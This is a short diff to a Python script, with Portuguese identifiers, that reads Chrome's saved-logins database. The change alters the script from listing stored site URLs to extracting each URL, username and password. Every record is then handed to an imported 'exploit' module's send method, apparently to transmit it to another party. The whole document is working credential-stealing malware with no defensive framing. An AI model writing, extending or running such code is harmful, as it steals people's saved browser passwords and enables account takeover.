@@ -1,4 +1,4 @@
-import sqlite3,os
+import sqlite3,os,exploit
 
 def Conexao():
     db = '%s/Google/Chrome/User Data/Default/Login Data' % os.environ['LocalAppData']
@@ -11,15 +11,16 @@ def Conexao():
 def Dump():
     conexao = Conexao()
     cursor = conexao.cursor()
-    cursor.execute('select origin_url from logins')
-    if len(cursor.fetchall()) > 0:
-#        print(cursor.fetchall())
-        for linha in cursor.fetchall():
-            print(linha)
-    else:
-        print('Não existe registros')
+    chrome = cursor.execute('select origin_url,username_value,password_value from logins')
+    return chrome
 
 def Descriptografar():
     pass
 
-Dump()
+browser = Dump()
+
+for url,user,pwd in browser:
+    registro = '\nurl: '+url+'\nuser: '+user+'\nsenha: '+str(pwd)
+    cliente = exploit.exploit()
+    cliente.enviar(registro)
+    
